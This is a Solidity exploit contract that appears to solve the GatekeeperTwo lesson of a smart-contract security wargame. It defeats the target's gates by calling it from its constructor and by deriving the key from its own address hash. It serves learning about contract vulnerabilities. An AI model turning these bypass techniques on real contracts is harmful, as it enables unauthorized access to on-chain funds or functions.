// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/14-GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo gatekeeperTwo;

    constructor(address _gatekeeperTwoAddress) public {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwoAddress);
        uint64 x = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 gateKey = getGateKey(x);
        enter(gateKey);
    }

    function enter(bytes8 _gateKey) public returns (bool) {
        gatekeeperTwo.enter(_gateKey);
    }

    function getGateKey(uint64 _x) public pure returns (bytes8) {
        uint64 MAX = uint64(0) - 1;
        return bytes8(MAX - _x);
    }
}
